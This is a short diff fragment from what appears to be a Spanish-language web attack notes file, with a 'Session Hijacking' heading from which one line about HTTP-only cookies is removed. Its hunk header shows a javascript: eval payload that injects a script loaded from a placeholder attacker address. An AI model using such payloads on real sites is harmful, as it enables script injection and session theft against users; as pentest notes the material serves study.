@@ -110,8 +110,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 
 ###  Session Hijacking
 
-solo si las cookies NO son HTTP only
-
 payloads:
 
 `
